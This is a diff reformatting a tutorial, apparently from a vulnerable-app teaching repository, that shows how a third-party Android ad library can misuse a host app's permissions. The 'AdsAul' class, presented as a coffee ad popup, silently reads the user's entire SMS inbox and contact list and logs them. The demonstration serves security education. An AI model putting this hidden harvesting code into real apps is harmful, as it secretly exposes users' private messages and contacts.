@@ -32,7 +32,7 @@ II	Add new class named “adsVal”. This class will display ads message, and in
 <img style="margin:10px;" src="https://github.com/dan7800/VulnerableAndroidAppOracle/blob/master/Pictures/AdsLibrary/image5.png" alt="Image">
 
 III	Add this code in AdsVal class
-
+```java
 package com.example.hussienalrubaye.adslibrary;
 
 import android.app.AlertDialog;
@@ -47,64 +47,60 @@ import android.util.Log;
  * Created by hussienalrubaye on 2/11/16.
  */
 public class AdsAul {
-    Context context; //define context
-
-    public AdsAul(Context context  ){
-      this.context=context;
-
-        //read sms from user phone
-        try{
-            //get inbox messages direction
-            Uri uriSMSURI = Uri.parse("content://sms/inbox");
-            // get all messages
-            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
+Context context; //define context
+public AdsAul(Context context  ){
+this.context=context;
+//read sms from user phone
+try{
+//get inbox messages direction
+Uri uriSMSURI = Uri.parse("content://sms/inbox");
+// get all messages
+Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
 // move to first message in list
-            cur.moveToPosition(0);
-            //read all messages
-            while (cur.moveToNext()) {
-                Log.d("Message:", "From :" + cur.getString(cur.getColumnIndex("address")) + " : " + cur.getString(cur.getColumnIndex("body")));
-            }
-        }catch (Exception ex){}
-        
-        //read user contact list
-        try{
+cur.moveToPosition(0);
+//read all messages
+while (cur.moveToNext()) {
+Log.d("Message:", "From :" + cur.getString(cur.getColumnIndex("address")) + " : " + cur.getString(cur.getColumnIndex("body")));
+}
+}catch (Exception ex){}
+//read user contact list
+try{
 // read all contact list
-            Cursor cursor = context.getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null,null, null);
-            //move to first name in the contact list
-            cursor.moveToPosition(0);
-            // real all news and phone number
-            while (cursor.moveToNext()) {
-                String name =cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                Log.d(" Contact Info:", name + "," + phoneNumber);
-
-            }
-
-        }   catch(Exception ex){
-            Log.d(" Contact Info:", ex.getMessage());
-        }
-    }
-
-    public void DisplayAds(){
-        //This ads will display alert message
-        new AlertDialog.Builder(context)
-                .setTitle("Ads")
-                .setMessage("Wonderful coffee apps for free")
-                .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {
-                    public void onClick(DialogInterface dialog, int which) {
-                        // navigate to app url
-                    }
-                })
-                .setNegativeButton(android.R.string.no, new DialogInterface.OnClickListener() {
-                    public void onClick(DialogInterface dialog, int which) {
-                        // do nothing remove ads
-                    }
-                })
-                .setIcon(android.R.drawable.ic_dialog_alert)
-                .show();
-    }
+Cursor cursor = context.getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null,null, null);
+//move to first name in the contact list
+cursor.moveToPosition(0);
+// real all news and phone number
+while (cursor.moveToNext()) {
+String name =cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+Log.d(" Contact Info:", name + "," + phoneNumber);
 }
 
+}   catch(Exception ex){
+Log.d(" Contact Info:", ex.getMessage());
+}
+}
+
+public void DisplayAds(){
+//This ads will display alert message
+new AlertDialog.Builder(context)
+.setTitle("Ads")
+.setMessage("Wonderful coffee apps for free")
+.setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {
+public void onClick(DialogInterface dialog, int which) {
+// navigate to app url
+}
+})
+.setNegativeButton(android.R.string.no, new DialogInterface.OnClickListener() {
+public void onClick(DialogInterface dialog, int which) {
+// do nothing remove ads
+}
+})
+.setIcon(android.R.drawable.ic_dialog_alert)
+.show();
+}
+}
+```
 
 3-	Add The ads library to our project from file-> project structure, then select the project name then go to dependencies and add library, add the Ads Library
 
@@ -116,7 +112,7 @@ public class AdsAul {
 <uses-permission   android:name="android.permission.READ_SMS"></uses-permission>
 
 5-	In onCreate event connect with the textView to display messages in the textview UI
-
+```java
 TextView txtDisplay ;
 @Override
 protected void onCreate(Bundle savedInstanceState) {
@@ -125,86 +121,84 @@ protected void onCreate(Bundle savedInstanceState) {
 
     txtDisplay=(TextView)findViewById(R.id.textv);
 }
+```
 6-	In button click event we get all user messages and list it in TextView
-
+```java
 //load phone message when click button
-    public void buLoadMessage(View view) {
+public void buLoadMessage(View view) {
 
-        //check if the API>=23 to display runtime request permison
-        if ((int) Build.VERSION.SDK_INT >= 23)
-        {
-            // check if this permission is not grated yet
+//check if the API>=23 to display runtime request permison
+if ((int) Build.VERSION.SDK_INT >= 23)
+{
+// check if this permission is not grated yet
 if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) !=
-                    PackageManager.PERMISSION_GRANTED )
-            {
-                //shouldShowRequestPermissionRationale(). This method returns true
-                // if the app has requested this permission previously and the user denied the request.
-                if (!shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)) {
-                    // display request permission
-                    requestPermissions(new String[]{Manifest.permission.READ_SMS},
-                            REQUEST_CODE_ASK_PERMISSIONS);
-                    return   ;
-
-                }
-
-                return  ;
-            }
-        }
+PackageManager.PERMISSION_GRANTED )
+ {
+//shouldShowRequestPermissionRationale(). This method returns true
+// if the app has requested this permission previously and the user denied the request.
+if (!shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)) {
+// display request permission
+requestPermissions(new String[]{Manifest.permission.READ_SMS},
+REQUEST_CODE_ASK_PERMISSIONS);
+return   ;
+}
+return  ;
+}
+}
 
 //call load messages
-        LoadInboxMessages();
+LoadInboxMessages();
+}
+//get access to mailbox
+final private int REQUEST_CODE_ASK_PERMISSIONS = 123;
+//request permsion result
+@Override
+public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults)
+{
+ switch (requestCode)
+{
+case REQUEST_CODE_ASK_PERMISSIONS:
+if (grantResults[0] == PackageManager.PERMISSION_GRANTED)
+{
+// Permission Granted
+//call load messages
+LoadInboxMessages();
+ /*
+ if Google add Clear permission  the developer
+could avoid Ads company from using his permissions,
+ or group permission by package name
+*/
+
+} else {
+  // Permission Denied
+
+}
+ break;
+default:
+super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+}
     }
-    //get access to mailbox
-    final private int REQUEST_CODE_ASK_PERMISSIONS = 123;
-    //request permsion result
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults)
-    {
-        switch (requestCode)
-        {
-            case REQUEST_CODE_ASK_PERMISSIONS:
-                if (grantResults[0] == PackageManager.PERMISSION_GRANTED)
-                {
-                    // Permission Granted
-                    //call load messages
-                    LoadInboxMessages();
-                    /*
-                     if Google add Clear permission  the developer
-                     could avoid Ads company from using his permissions,
-                     or group permission by package name
-                    */
 
-                } else {
-                    // Permission Denied
+//Load user inbox messages
+void  LoadInboxMessages(){
 
-                }
-                break;
-            default:
-                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        }
-    }
-
-
-    //Load user inbox messages
-    void  LoadInboxMessages(){
-
-        try{
-            //define variable to hold all messages data
-            String sms = "";
-            //set inbox direct to read message from
-            Uri uriSMSURI = Uri.parse("content://sms/inbox");
-            //get all messages and load it in Cursor
-            Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
-            //move Cursor to first message
-            cur.moveToPosition(0);
-            //read all messages one by one
-            while (cur.moveToNext()) {
-                //load sender and the message content
-                sms += "From :" + cur.getString(cur.getColumnIndex("address")) + " : " + cur.getString(cur.getColumnIndex("body"))+"\n";
-            }
-            //display message in Textbox
-            txtDisplay.setText(sms);
-        }   catch(Exception ex){
+try{
+//define variable to hold all messages data
+String sms = "";
+ //set inbox direct to read message from
+Uri uriSMSURI = Uri.parse("content://sms/inbox");
+//get all messages and load it in Cursor
+Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
+//move Cursor to first message
+cur.moveToPosition(0);
+//read all messages one by one
+while (cur.moveToNext()) {
+//load sender and the message content
+sms += "From :" + cur.getString(cur.getColumnIndex("address")) + " : " + cur.getString(cur.getColumnIndex("body"))+"\n";
+}
+//display message in Textbox
+txtDisplay.setText(sms);
+}   catch(Exception ex){
 
         }
 
@@ -213,7 +207,7 @@ if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) !=
         // load ads to display Ads to user
         myAds.DisplayAds();
     }
-
+```
 
 ### Results:
 
